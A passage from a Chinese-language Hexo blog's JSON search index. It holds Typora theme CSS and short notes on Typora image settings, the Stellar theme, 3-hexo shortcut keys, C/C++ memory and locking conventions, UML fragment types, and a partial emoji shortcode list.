url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAMCAYAAAAkuj5RAAAAAXNSR0IArs4c6QAAAGFJREFUSMft1LsRQFAQheHPowAKoACx3IgEKtaEHujDjORSgWTH/ZOdnZOcM/sgk/kFFWY0qV8foQwS4MKBCS3qR6ixBJvElOobYAtivseIE120FaowJPN75GMu8j/LfMwNjh4HUpwg4LUAAAAASUVORK5CYII=); background-position: right; background-repeat: no-repeat; width: 100%; opacity: 1&#125;.CodeMirror-activeline .cm-startspace:after,.CodeMirror-activeline .cm-trailing-space-new-line:after &#123; opacity: .2&#125;.cm-s-inner .CodeMirror-vscrollbar &#123; display: none !important&#125;#typora-source .CodeMirror-gutter-wrapper &#123; position: absolute !important; left: -6ch !important; min-width: 4ch !important; text-align: right; font-family: monospace; font-size: .8rem; margin-top: .1rem; display: inline-block; opacity: .6&#125;#typora-source .CodeMirror-linenumber &#123; width: auto !important; visibility: hidden&#125;#typora-source .CodeMirror-sizer &#123; margin-left: 0 !important&#125;#typora-source .CodeMirror-gutter &#123; min-width: 4ch !important&#125;#typora-source .CodeMirror-activeline .CodeMirror-linenumber,#typora-source .CodeMirror-linenumber.CodeMirror-linenumber-show &#123; visibility: visible&#125;#typora-source .CodeMirror-code&gt;.CodeMirror-activeline::before,#typora-source .CodeMirror-code&gt;:first-child::before,#typora-source .CodeMirror-code&gt;:last-child::before,#typora-source .CodeMirror-code&gt;:nth-child(10n)::before &#123; visibility: visible&#125;.cm-s-typora-default .cm-header1:not(.cm-atom):not(.cm-s-inner) &#123; font-size: 2.2rem;&#125;.cm-s-typora-default .cm-header2:not(.cm-atom):not(.cm-s-inner) &#123; font-size: 2rem;&#125;.cm-s-typora-default .cm-header3:not(.cm-atom):not(.cm-s-inner) &#123; font-size: 1.6rem;&#125;.cm-s-typora-default .cm-header4:not(.cm-atom):not(.cm-s-inner) &#123; font-size: 1.4rem;&#125;.cm-s-typora-default .cm-header5:not(.cm-atom):not(.cm-s-inner) &#123; font-size: 1.2rem;&#125;.cm-s-typora-default .cm-header6:not(.cm-atom):not(.cm-s-inner) &#123; font-size: 1.2rem;&#125;.cm-s-typora-default .cm-header,.cm-s-typora-default .cm-property &#123; color: #183055 !important;&#125;pre.CodeMirror-line &#123; page-break-inside: avoid;&#125;/****** Code style ******/code &#123; font-size: .9rem; /* color: #333333; /* #537AA2; border: 1px solid #d0d0d0; */ font-family: &#x27;Cascadia Code&#x27;, Consolas, &#x27;Noto Sans SC&#x27;, &#x27;Courier New&#x27;, monospace; padding: .2rem .2rem; border-radius: 3px; background: #f5f7f9 !important; display: inline; vertical-align: bottom; line-height: 1.8;&#125;code,pre &#123; font-size: 95% !important; font-weight: normal; font-family: &#x27;Cascadia Code&#x27;, Consolas, &#x27;Noto Sans SC&#x27;, &#x27;Courier New&#x27;, monospace; -webkit-font-smoothing: initial; -moz-osx-font-smoothing: initial&#125;/****** The flow chart ******/pre.md-fences[lang=sequence].md-focus .md-diagram-panel,pre.md-fences[lang=flow].md-focus .md-diagram-panel,pre.md-fences[lang=mermaid].md-focus .md-diagram-panel &#123; position: -webkit-sticky; border: 1px solid #777; border-radius: 6px; margin-top: 6px;&#125;.code-tooltip .ty-input,.code-tooltip input &#123; background-color: transparent; border: 0; margin-top: 2px; margin-bottom: 2px; margin-left: 0; margin-right: 0; border-radius: 3px; text-align: center; min-width: 140px; display: inline-block; padding: 0 4px; line-height: 1.5; color: #fff;&#125;.enable-diagrams pre.md-fences[lang=sequence] .code-tooltip,.enable-diagrams pre.md-fences[lang=flow] .code-tooltip,.enable-diagrams pre.md-fences[lang=mermaid] .code-tooltip &#123; right: 8px; bottom: -2.2em;&#125;/****** Windows contral ******/.megamenu-menu-list li a.active,.megamenu-menu-list:not(.saved) li a:hover &#123; background-color: #285e8e;&#125;/****** Fix ******/.md-tab &#123; display: inline-block; white-space: pre; font-family: initial;&#125;div.md-mathjax-preview.mathjax-candidate.mathjax-candidate-show &#123; background-color: white !important; -webkit-user-modify: read-only;&#125;.mathjax-candidate &#123; text-align: center; padding-top: inherit; overflow-x: auto; padding: 10px 0; background-color: white;&#125;input &#123; font-weight: bold; background-color: inherit; background-color: var(--bg-color); color: var(--text-color) !important;&#125;#write input &#123; transform: translateY(-6.5px);&#125;.task-list &#123; padding-left: 0;&#125;.md-task-list-item&gt;input &#123; top: -0.2rem; margin-left: -1.6rem; margin-top: calc(1rem + 1px);&#125;.auto-suggest-container li &#123; padding: 1px; padding-left: 10px; padding-right: 10px; cursor: pointer; -webkit-user-select: none; user-select: none; min-width: 124px; position: relative; line-height: 1.4;&#125;.auto-suggest-container &#123; border: 1px solid #ddd; border-radius: 3px; box-shadow: 0 0 1px rgba(0, 0, 0, .1); position: fixed; background-color: #fff; background-color: var(--bg-color); z-index: 10; font-size: .9rem; display: none; padding: 4px 6px 4px 6px; line-height: 20px;&#125;/****** Code highlight ******/.cm-s-inner .CodeMirror-guttermarker,.cm-s-inner .CodeMirror-guttermarker-subtle,.cm-s-inner .CodeMirror-linenumber &#123; color: #596774;&#125;.cm-s-inner .CodeMirror-cursor &#123; border-left: 1px solid #f8f8f0;&#125;.cm-s-inner div.CodeMirror-selected &#123; background: rgba(255, 255, 255, 0.15);&#125;.cm-s-inner.CodeMirror-focused div.CodeMirror-selected &#123; background: rgba(255, 255, 255, 0.10);&#125;.cm-s-inner .CodeMirror-line::selection,.cm-s-inner .CodeMirror-line&gt;span::selection,.cm-s-inner .CodeMirror-line&gt;span&gt;span::selection &#123; background: rgba(255, 255, 255, 0.10);&#125;.cm-s-inner .CodeMirror-line::-moz-selection,.cm-s-inner .CodeMirror-line&gt;span::-moz-selection,.cm-s-inner .CodeMirror-line&gt;span&gt;span::-moz-selection &#123; background: rgba(255, 255, 255, 0.10);&#125;.cm-s-inner .CodeMirror-activeline-background &#123; background: rgba(0, 0, 0, 0);&#125;.cm-s-inner .cm-keyword &#123; color: rgba(199, 146, 234, 1);&#125;.cm-s-inner .cm-operator &#123; color: rgba(233, 237, 237, 1);&#125;.cm-s-inner .cm-variable-2 &#123; color: #80CBC4;&#125;.cm-s-inner .cm-variable-3 &#123; color: #82B1FF;&#125;.cm-s-inner .cm-builtin &#123; color: #DECB6B;&#125;.cm-s-inner .cm-atom &#123; color: #F77669;&#125;.cm-s-inner .cm-number &#123; color: #F77669;&#125;.cm-s-inner .cm-def &#123; color: rgba(233, 237, 237, 1);&#125;.cm-s-inner .cm-string &#123; color: #C3E88D;&#125;.cm-s-inner .cm-string-2 &#123; color: #80CBC4;&#125;.cm-s-inner .cm-comment &#123; color: #aebcc2;&#125;.cm-s-inner .cm-variable &#123; color: #82B1FF;&#125;.cm-s-inner .cm-tag &#123; color: #80CBC4;&#125;.cm-s-inner .cm-meta &#123; color: #80CBC4;&#125;.cm-s-inner .cm-attribute &#123; color: #FFCB6B;&#125;.cm-s-inner .cm-property &#123; color: #80CBAE;&#125;.cm-s-inner .cm-qualifier &#123; color: #DECB6B;&#125;.cm-s-inner .cm-variable-3 &#123; color: #DECB6B;&#125;.cm-s-inner .cm-tag &#123; color: rgba(255, 83, 112, 1);&#125;.cm-s-inner .cm-error &#123; color: rgba(255, 255, 255, 1.0); background-color: #EC5F67;&#125;.cm-s-inner .CodeMirror-matchingbracket &#123; text-decoration: underline; color: white !important;&#125;.cm-s-inner .cm-header,.cm-s-inner.cm-header &#123; color: #334EEA;&#125;.md-fences .code-tooltip &#123; background-color: #263238;&#125;","tags":[{"name":"手册","slug":"手册","permalink":"http://example.com/tags/%E6%89%8B%E5%86%8C/"},{"name":"自定义","slug":"自定义","permalink":"http://example.com/tags/%E8%87%AA%E5%AE%9A%E4%B9%89/"},{"name":"themes","slug":"themes","permalink":"http://example.com/tags/themes/"}],"categories":[{"name":"E_手册","slug":"E-手册","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"个人配置","slug":"E-手册/个人配置","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/%E4%B8%AA%E4%BA%BA%E9%85%8D%E7%BD%AE/"}]},{"title":"Typora 图像配置","date":"2023-10-27T01:24:02.486Z","path":"E_手册/个人配置/Typora图像配置/","text":"图片保存路径： 1./$&#123;filename&#125;/ rename-file 插件上传配置 1&#123;localFolder:3&#125;/&#123;origin&#125; 图源： 1https://source.unsplash.com/1280x640/?Technology","tags":[],"categories":[{"name":"E_手册","slug":"E-手册","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"个人配置","slug":"E-手册/个人配置","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/%E4%B8%AA%E4%BA%BA%E9%85%8D%E7%BD%AE/"}]},{"title":"【手册】Stellar 主题用法","date":"2023-10-27T01:24:02.485Z","path":"E_手册/个人配置/Stellar主题用法/","text":"概述: Stellar 主题的用法整理 引用文章123456---references: - &#x27;[心跳之旅—💗—iOS用手机摄像头检测心率(PPG)](https://punmy.cn/2016/07/28/15231176397746.html) - &#x27;[PPG光电容积脉搏波描记法技术概况](https://www.jianshu.com/p/695c131abfa5) ...--- projects.yml 配置12345678910111213141516171819202122Stellar: name: Stellar title: Hexo 主题配置 subtitle: &#x27;每个人的独立博客 | Designed by xaoxuu&#x27; tags: Hexo cover: false logo: src: /images/avator.png small: 112px large: 240px description: 个人使用过的 Hexo 主题配置记录 # repo: xaoxuu/hexo-theme-stellar # comment_title: &#x27;评论区仅供交流，有问题请提 [issue](https://github.com/xaoxuu/hexo-theme-stellar/issues) 反馈。&#x27; # giscus: # data-repo: xaoxuu/hexo-theme-stellar # data-mapping: number # data-term: 226 sections: &#x27;快速开始&#x27;: [0, 99] &#x27;基本使用&#x27;: [100, 199] &#x27;文档系统&#x27;: [200, 299] &#x27;进阶设定&#x27;: [900, 999] 文章自定义边栏123456789sidebar: - toc - layout: markdown title: &#x27;重要通知 [NOTE.2022-09]&#x27; content: | 请不要原封不动的把本站内容复制到贵站中使用，这样一方面不尊重原作者，另一方面也会因为存在大量重复内容影响贵站收录甚至降权。 从2022年9月起本站已不再开源，已经持有源码副本或`fork`的朋友请及时删除以防止被他人恶意搬运的情况继续发生。 封面Stellar 主题可以使用 UnSplash 的图片，可以参照主题 Readme 文档中 UnSplash 章节。参考文章：UnSplash 获取随机图片的API 另外，如果文章中有图片，也可以使用文章内图片作为文章封面： 1../../&#123;从_post开始的图片路径，不含_post&#125; 时间线12&#123;% timeline api:https://api.github.com/repos/xaoxuu/hexo-theme-stellar/releases?per_page=1 %&#125;&#123;% endtimeline %&#125; FancyBox1234// 添加 data-fancybox 属性newImgTag = newImgTag.replace(/(&lt;img.*?)(&gt;)/gi, function(ori, before, after) &#123; return before + &#x27; data-fancybox=&quot;true&quot;&#x27; + after;&#125;);","tags":[],"categories":[{"name":"E_手册","slug":"E-手册","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"个人配置","slug":"E-手册/个人配置","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/%E4%B8%AA%E4%BA%BA%E9%85%8D%E7%BD%AE/"}]},{"title":"Github profile 配置","date":"2023-10-27T01:24:02.485Z","path":"E_手册/个人配置/Github profile/","text":"Metrics1![Metrics](github-metrics.svg)","tags":[],"categories":[{"name":"E_手册","slug":"E-手册","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"个人配置","slug":"E-手册/个人配置","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/%E4%B8%AA%E4%BA%BA%E9%85%8D%E7%BD%AE/"}]},{"title":"3-hexo 主题快捷键","date":"2023-10-27T01:24:02.484Z","path":"E_手册/个人配置/3-hexo主题快捷键/","text":"快捷键为vim风格的。按键可能与vimium（chrome插件）的快捷键有冲突，插件设置屏蔽掉此站的快捷键即可 说明全局 Key Descption s&#x2F;S 全屏&#x2F;取消全屏 w&#x2F;W 打开&#x2F;关闭文章目录 i&#x2F;I 获取搜索框焦点 j&#x2F;J 向下滑动 k&#x2F;K 向上滑动 gg&#x2F;GG 到最顶端 shift+G&#x2F;g 到最下端 搜索框 Key Descption ESC 1.如果输入框有内容，清除内容 2.如果输入框无内容，失去焦点 下 向下选择文章 上 向上选择文章 回车 打开当前选中的文章，若没有，则默认打开第一个 关闭快捷键在主题下 _config.yml 中 找到 shortcutKey 设为 false 1shortcutKey: false","tags":[{"name":"快捷键","slug":"快捷键","permalink":"http://example.com/tags/%E5%BF%AB%E6%8D%B7%E9%94%AE/"},{"name":"hexo","slug":"hexo","permalink":"http://example.com/tags/hexo/"}],"categories":[{"name":"E_手册","slug":"E-手册","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"个人配置","slug":"E-手册/个人配置","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/%E4%B8%AA%E4%BA%BA%E9%85%8D%E7%BD%AE/"}]},{"title":"代码规范","date":"2023-10-27T01:24:02.482Z","path":"E_手册/safecode/","text":"TrustClient 相关1） win api使用宏控制123#ifdef Q_OS_WIN #include &lt;Windows.h&gt;#endif 内存相关函数段 申请内存 12345678void *zallloc(size_t len) &#123; void *p = malloc(len); if(p) &#123; memset(p, 0, len); &#125; return p;&#125; 常用的宏1234#define safe_free(p) &#123;\\ free(p);\\ p = NULL;\\&#125;\\ 线程的资源竞争 对链表、边界资源、临界区域的操作一定要加锁 12345678std::mutex mtx; // 保护countermtx.lock();// 要进行的资源操作todo();mtx.unlock();","tags":[{"name":"code","slug":"code","permalink":"http://example.com/tags/code/"}],"categories":[{"name":"E_手册","slug":"E-手册","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/"}]},{"title":"UML 片段说明","date":"2023-10-27T01:24:02.481Z","path":"E_手册/UML/片段说明/","text":"片断类型 名称 说明 Opt 选项 包含一个可能发生或可能不发生的序列。 能够在临界中指定序列发生的条件。 Alt 抉择 包含一个片断列表，这些片断包含备选消息序列。 在任何场合下只发生一个序列。能够在每一个片断中设置一个临界来指示该片断能够运行的条件。 else 的临界指示其余任何临界都不为 True 时应运行的片断。 若是全部临界都为 False 而且没有 else，则不执行任何片断。 Loop 循环 片断重复必定次数。 能够在临界中指示片断重复的条件。Loop 组合片断具备“Min”和“Max”属性，它们指示片断能够重复的最小和最大次数。 默认值是无限制。 Break 中断 若是执行此片断，则放弃序列的其他部分。 可使用临界来指示发生中断的条件。 Par 并行 并行处理。 片断中的事件能够交错。 Critical 关键 用在 Par 或 Seq 片断中。 指示此片断中的消息不得与其余消息交错。 Seq 弱顺序 有两个或更多操做数片断。 涉及同一辈子命线的消息必须以片断的顺序发生。 若是消息涉及的生命线不一样，来自不一样片断的消息可能会并行交错。 Strict 强顺序 有两个或更多操做数片断。 这些片断必须按给定顺序发生。","tags":[],"categories":[{"name":"E_手册","slug":"E-手册","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"UML","slug":"E-手册/UML","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/UML/"}]},{"title":"Typora Emoji","date":"2023-10-27T01:24:02.480Z","path":"E_手册/Typora Emoji/","text":"[toc] People 😄 :smile: 😆 :laughing: 😊 :blush: 😃 :smiley: ☺️ :relaxed: 😏 :smirk: 😍 :heart_eyes: 😘 :kissing_heart: 😚 :kissing_closed_eyes: 😳 :flushed: 😌 :relieved: 😆 :satisfied: 😁 :grin: 😉 :wink: 😜 :stuck_out_tongue_winking_eye: 😝 :stuck_out_tongue_closed_eyes: 😀 :grinning: 😗 :kissing: 😙 :kissing_smiling_eyes: 😛 :stuck_out_tongue: 😴 :sleeping: 😟 :worried: 😦 :frowning: 😧 :anguished: 😮 :open_mouth: 😬 :grimacing: 😕 :confused: 😯 :hushed: 😑 :expressionless: 😒 :unamused: 😅 :sweat_smile: 😓 :sweat: 😥 :disappointed_relieved: 😩 :weary: 😔 :pensive: 😞 :disappointed: 😖 :confounded: 😨 :fearful: 😰 :cold_sweat: 😣 :persevere: 😢 :cry: 😭 :sob: 😂 :joy: 😲 :astonished: 😱 :scream: 😫 :tired_face: 😠 :angry: 😡 :rage: 😤 :triumph: 😪 :sleepy: 😋 :yum: 😷 :mask: 😎 :sunglasses: 😵 :dizzy_face: 👿 :imp: 显示详细信息 😈 :smiling_imp: 😐 :neutral_face: 😶 :no_mouth: 😇 :innocent: 👽 :alien: 💛 :yellow_heart: 💙 :blue_heart: 💜 :purple_heart: ❤️ :heart: 💚 :green_heart: 💔 :broken_heart: 💓 :heartbeat: 💗 :heartpulse: 💕 :two_hearts: 💞 :revolving_hearts: 💘 :cupid: 💖 :sparkling_heart: ✨ :sparkles: ⭐️ :star: 🌟 :star2: 💫 :dizzy: 💥 :boom: 💥 :collision: 💢 :anger: ❗️ :exclamation: ❓ :question: ❕ :grey_exclamation: ❔ :grey_question: 💤 :zzz: 💨 :dash: 💦 :sweat_drops: 🎶 :notes: 🎵 :musical_note: 🔥 :fire: 💩 :hankey: 💩 :poop: 💩 :shit: 👍 :+1: 👍 :thumbsup: 👎 :-1: 👎 :thumbsdown: 👌 :ok_hand: 👊 :punch: 👊 :facepunch: ✊ :fist: ✌️ :v: 👋 :wave: ✋ :hand: ✋ :raised_hand: 👐 :open_hands: ☝️ :point_up: 👇 :point_down: 👈 :point_left: 👉 :point_right: 🙌 :raised_hands: 🙏 :pray: 👆 :point_up_2: 👏 :clap: 💪 :muscle: 🤘 :metal: 🖕 :fu: 🚶 :walking: 🏃 :runner: 🏃 :running: 👫 :couple: 👪 :family: 👬 :two_men_holding_hands: 👭 :two_women_holding_hands: 💃 :dancer: 👯 :dancers: 🙆 :ok_woman: 🙅 :no_good: 💁 :information_desk_person: 🙋 :raising_hand: 👰 :bride_with_veil: 🙎 :person_with_pouting_face: 🙍 :person_frowning: 🙇 :bow: 💏 :couplekiss: 💑 :couple_with_heart: 💆 :massage: 💇 :haircut: 💅 :nail_care: 👦 :boy: 👧 :girl: 👩 :woman: 👨 :man: 👶 :baby: 👵 :older_woman: 👴 :older_man: 👱 :person_with_blond_hair: 👲 :man_with_gua_pi_mao: 👳 :man_with_turban: 👷 :construction_worker: 👮 :cop: 👼 :angel: 👸 :princess: 😺 :smiley_cat: 😸 :smile_cat: 😻 :heart_eyes_cat: 😽 :kissing_cat: 😼 :smirk_cat: 🙀 :scream_cat: 😿 :crying_cat_face: 😹 :joy_cat: 😾 :pouting_cat: 👹 :japanese_ogre: 👺 :japanese_goblin: 🙈 :see_no_evil: 🙉 :hear_no_evil: 🙊 :speak_no_evil: 💂 :guardsman: 💀 :skull: 🐾 :feet: 👄 :lips: 💋 :kiss: 💧 :droplet: 👂 :ear: 👀 :eyes: 👃 :nose: 👅 :tongue: 💌 :love_letter: 👤 :bust_in_silhouette: 👥 :busts_in_silhouette: 💬 :speech_balloon: 💭 :thought_balloon: 显示详细信息 Nature ☀️ :sunny: ☔️ :umbrella: ☁️ :cloud: ❄️ :snowflake: ⛄️ :snowman: ⚡️ :zap: 🌀 :cyclone: 🌁 :foggy: 🌊 :ocean: 🐱 :cat: 🐶 :dog: 🐭 :mouse: 🐹 :hamster: 🐰 :rabbit: 🐺 :wolf: 🐸 :frog: 🐯 :tiger: 🐨 :koala: 🐻 :bear: 🐷 :pig: 🐽 :pig_nose: 🐮 :cow: 🐗 :boar: 🐵 :monkey_face: 🐒 :monkey: 🐴 :horse: 🐎 :racehorse: 🐫 :camel: 🐑 :sheep: 🐘 :elephant: 🐼 :panda_face: 🐍 :snake: 🐦 :bird: 🐤 :baby_chick: 🐥 :hatched_chick: 🐣 :hatching_chick: 🐔 :chicken: 🐧 :penguin: 🐢 :turtle: 🐛 :bug: 🐝 :honeybee: 🐜 :ant: 🐞 :beetle: 🐌 :snail: 🐙 :octopus: 🐠 :tropical_fish: 🐟 :fish: 🐳 :whale: 🐋 :whale2: 🐬 :dolphin: 🐄 :cow2: 🐏 :ram: 🐀 :rat: 🐃 :water_buffalo: 🐅 :tiger2: 🐇 :rabbit2: 🐉 :dragon: 🐐 :goat: 🐓 :rooster: 🐕 :dog2: 🐖 :pig2: 🐁 :mouse2: 🐂 :ox: 🐲 :dragon_face: 🐡 :blowfish: 🐊 :crocodile: 🐪 :dromedary_camel: 🐆 :leopard: 🐈 :cat2: 🐩 :poodle: 🐾 :paw_prints: 💐 :bouquet: 🌸 :cherry_blossom: 🌷 :tulip: 🍀 :four_leaf_clover: 🌹 :rose: 🌻 :sunflower: 🌺 :hibiscus: 🍁 :maple_leaf: 🍃 :leaves: 🍂 :fallen_leaf: 🌿 :herb: 🍄 :mushroom: 🌵 :cactus: 🌴 :palm_tree: 🌲 :evergreen_tree: 🌳 :deciduous_tree: 🌰 :chestnut: 🌱 :seedling: 🌼 :blossom: 🌾 :ear_of_rice: 🐚 :shell: 🌐 :globe_with_meridians: 🌞 :sun_with_face: 🌝 :full_moon_with_face: 🌚 :new_moon_with_face: 🌑 :new_moon: 🌒 :waxing_crescent_moon: 🌓 :first_quarter_moon: 🌔 :waxing_gibbous_moon: 🌕 :full_moon: 🌖 :waning_gibbous_moon: 🌗 :last_quarter_moon: 🌘 :waning_crescent_moon: 🌜 :last_quarter_moon_with_face: 🌛 :first_quarter_moon_with_face: 🌔 :moon: 🌍 :earth_africa: 🌎 :earth_americas: 🌏 :earth_asia: 🌋 :volcano: 🌌 :milky_way: ⛅️ :partly_sunny: 显示详细信息 Objects 🎍 :bamboo: 💝 :gift_heart: 🎎 :dolls: 🎒 :school_satchel: 🎓 :mortar_board: 🎏 :flags: 🎆 :fireworks: 🎇 :sparkler: 🎐 :wind_chime: 🎑 :rice_scene: 🎃 :jack_o_lantern: 👻 :ghost: 🎅 :santa: 🎄 :christmas_tree: 🎁 :gift: 🔔 :bell: 🔕 :no_bell: 🎋 :tanabata_tree: 🎉 :tada: 🎊 :confetti_ball: 🎈 :balloon: 🔮 :crystal_ball: 💿 :cd: 📀 :dvd: 💾 :floppy_disk: 📷 :camera: 📹 :video_camera: 🎥 :movie_camera: 💻 :computer: 📺 :tv: 📱 :iphone: ☎️ :phone: ☎️ :telephone: 📞 :telephone_receiver: 📟 :pager: 📠 :fax: 💽 :minidisc: 📼 :vhs: 🔉 :sound: 🔈 :speaker: 🔇 :mute: 📢 :loudspeaker: 📣 :mega: ⌛️ :hourglass: ⏳ :hourglass_flowing_sand: ⏰ :alarm_clock: ⌚️ :watch: 📻 :radio: 📡 :satellite: ➿ :loop: 🔍 :mag: 🔎 :mag_right: 🔓 :unlock: 🔒 :lock: 🔏 :lock_with_ink_pen: 🔐 :closed_lock_with_key: 🔑 :key: 💡 :bulb: 🔦 :flashlight: 🔆 :high_brightness: 🔅 :low_brightness: 🔌 :electric_plug: 🔋 :battery: 📲 :calling: ✉️ :email: 📫 :mailbox: 📮 :postbox: 🛀 :bath: 🛁 :bathtub: 🚿 :shower: 🚽 :toilet: 🔧 :wrench: 🔩 :nut_and_bolt: 🔨 :hammer: 💺 :seat: 💰 :moneybag: 💴 :yen: 💵 :dollar: 💷 :pound: 💶 :euro: 💳 :credit_card: 💸 :money_with_wings: 📧 :e-mail: 📥 :inbox_tray: 📤 :outbox_tray: ✉️ :envelope: 📨 :incoming_envelope: 📯 :postal_horn: 📪 :mailbox_closed: 📬 :mailbox_with_mail: 📭 :mailbox_with_no_mail: 🚪 :door: 🚬 :smoking: 💣 :bomb: 🔫 :gun: 🔪 :hocho: 💊 :pill: 💉 :syringe: 📄 :page_facing_up: 📃 :page_with_curl: 📑 :bookmark_tabs: 📊 :bar_chart: 📈 :chart_with_upwards_trend: 📉 :chart_with_downwards_trend: 📜 :scroll: 📋 :clipboard: 📆 :calendar: 📅 :date: 📇 :card_index: 📁 :file_folder: 📂 :open_file_folder: ✂️ :scissors: 📌 :pushpin: 📎 :paperclip: ✒️ :black_nib: ✏️ :pencil2: 📏 :straight_ruler: 📐 :triangular_ruler: 📕 :closed_book: 📗 :green_book: 📘 :blue_book: 📙 :orange_book: 📓 :notebook: 📔 :notebook_with_decorative_cover: 📒 :ledger: 📚 :books: 🔖 :bookmark: 📛 :name_badge: 🔬 :microscope: 🔭 :telescope: 📰 :newspaper: 🏈 :football: 🏀 :basketball: ⚽️ :soccer: ⚾️ :baseball: 🎾 :tennis: 🎱 :8ball: 🏉 :rugby_football: 🎳 :bowling: ⛳️ :golf: 🚵 :mountain_bicyclist: 🚴 :bicyclist: 🏇 :horse_racing: 🏂 :snowboarder: 🏊 :swimmer: 🏄 :surfer: 🎿 :ski: ♠️ :spades: ♥️ :hearts: ♣️ :clubs: ♦️ :diamonds: 💎 :gem: 💍 :ring: 🏆 :trophy: 🎼 :musical_score: 🎹 :musical_keyboard: 🎻 :violin: 👾 :space_invader: 🎮 :video_game: 🃏 :black_joker: 🎴 :flower_playing_cards: 🎲 :game_die: 🎯 :dart: 🀄️ :mahjong: 🎬 :clapper: 📝 :memo: 📝 :pencil: 📖 :book: 🎨 :art: 🎤 :microphone: 🎧 :headphones: 🎺 :trumpet: 🎷 :saxophone: 🎸 :guitar: 👞 :shoe: 👡 :sandal: 👠 :high_heel: 💄 :lipstick: 👢 :boot: 👕 :shirt: 👕 :tshirt: 👔 :necktie: 👚 :womans_clothes: 👗 :dress: 🎽 :running_shirt_with_sash: 👖 :jeans: 👘 :kimono: 👙 :bikini: 🎀 :ribbon: 🎩 :tophat: 👑 :crown: 👒 :womans_hat: 👞 :mans_shoe: 🌂 :closed_umbrella: 💼 :briefcase: 👜 :handbag: 👝 :pouch: 👛 :purse: 👓 :eyeglasses: 🎣 :fishing_pole_and_fish: ☕️ :coffee: 🍵 :tea: 🍶 :sake: 🍼 :baby_bottle: 🍺 :beer: 🍻 :beers: 🍸 :cocktail: 🍹 :tropical_drink: 🍷 :wine_glass: 🍴 :fork_and_knife: 🍕 :pizza: 🍔 :hamburger: 🍟 :fries: 🍗 :poultry_leg: 🍖 :meat_on_bone: 🍝 :spaghetti: 🍛 :curry: 🍤 :fried_shrimp: 🍱 :bento: 🍣 :sushi: 🍥 :fish_cake: 🍙 :rice_ball: 🍘 :rice_cracker: 🍚 :rice: 🍜 :ramen: 🍲 :stew: 🍢 :oden: 🍡 :dango: 🥚 :egg: 🍞 :bread: 🍩 :doughnut: 🍮 :custard: 🍦 :icecream: 🍨 :ice_cream: 🍧 :shaved_ice: 🎂 :birthday: 🍰 :cake: 🍪 :cookie: 🍫 :chocolate_bar: 🍬 :candy: 🍭 :lollipop: 🍯 :honey_pot: 🍎 :apple: 🍏 :green_apple: 🍊 :tangerine: 🍋 :lemon: 🍒 :cherries: 🍇 :grapes: 🍉 :watermelon: 🍓 :strawberry: 🍑 :peach: 🍈 :melon: 🍌 :banana: 🍐 :pear: 🍍 :pineapple: 🍠 :sweet_potato: 🍆 :eggplant: 🍅 :tomato: 🌽 :corn: 显示详细信息 Places 🏠 :house: 🏡 :house_with_garden: 🏫 :school: 🏢 :office: 🏣 :post_office: 🏥 :hospital: 🏦 :bank: 🏪 :convenience_store: 🏩 :love_hotel: 🏨 :hotel: 💒 :wedding: ⛪️ :church: 🏬 :department_store: 🏤 :european_post_office: 🌇 :city_sunrise: 🌆 :city_sunset: 🏯 :japanese_castle: 🏰 :european_castle: ⛺️ :tent: 🏭 :factory: 🗼 :tokyo_tower: 🗾 :japan: 🗻 :mount_fuji: 🌄 :sunrise_over_mountains: 🌅 :sunrise: 🌠 :stars: 🗽 :statue_of_liberty: 🌉 :bridge_at_night: 🎠 :carousel_horse: 🌈 :rainbow: 🎡 :ferris_wheel: ⛲️ :fountain: 🎢 :roller_coaster: 🚢 :ship: 🚤 :speedboat: ⛵️ :boat: ⛵️ :sailboat: 🚣 :rowboat: ⚓️ :anchor: 🚀 :rocket: ✈️ :airplane: 🚁 :helicopter: 🚂 :steam_locomotive: 🚊 :tram: 🚞 :mountain_railway: 🚲 :bike: 🚡 :aerial_tramway: 🚟 :suspension_railway: 🚠 :mountain_cableway: 🚜 :tractor: 🚙 :blue_car: 🚘 :oncoming_automobile: 🚗 :car: 🚗 :red_car: 🚕 :taxi: 🚖 :oncoming_taxi: 🚛 :articulated_lorry: 🚌 :bus: 🚍 :oncoming_bus: 🚨 :rotating_light: 🚓 :police_car: 🚔 :oncoming_police_car: 🚒 :fire_engine: 🚑 :ambulance: 🚐 :minibus: 🚚 :truck: 🚋 :train: 🚉 :station: 🚆 :train2: 🚅 :bullettrain_front: 🚄 :bullettrain_side: 🚈 :light_rail: 🚝 :monorail: 🚃 :railway_car: 🚎 :trolleybus: 🎫 :ticket: ⛽️ :fuelpump: 🚦 :vertical_traffic_light: 🚥 :traffic_light: ⚠️ :warning: 🚧 :construction: 🔰 :beginner: 🏧 :atm: 🎰 :slot_machine: 🚏 :busstop: 💈 :barber: ♨️ :hotsprings: 🏁 :checkered_flag: 🎌 :crossed_flags: 🏮 :izakaya_lantern: 🗿 :moyai: 🎪 :circus_tent: 🎭 :performing_arts: 📍 :round_pushpin: 🚩 :triangular_flag_on_post: 🇯🇵 :jp: 🇰🇷 :kr: 🇨🇳 :cn: 🇺🇸 :us: 🇫🇷 :fr: 🇪🇸 :es: 🇮🇹 :it: 🇷🇺 :ru: 🇬🇧 :gb: 🇬🇧 :uk: 🇩🇪 :de: 显示详细信息 Symbols 1️⃣ :one: 2️⃣ :two: 3️⃣ :three: 4️⃣ :four: 5️⃣ :five: 6️⃣ :six: 7️⃣ :seven: 8️⃣ :eight: 9️⃣ :nine: 🔟 :keycap_ten: 🔢 :1234: 0️⃣ :zero: #️⃣ :hash: 🔣 :symbols: ◀️ :arrow_backward: ⬇️ :arrow_down: ▶️ :arrow_forward: ⬅️ :arrow_left: 🔠 :capital_abcd: 🔡 :abcd: 🔤 :abc: ↙️ :arrow_lower_left: ↘️ :arrow_lower_right: ➡️ :arrow_right: ⬆️ 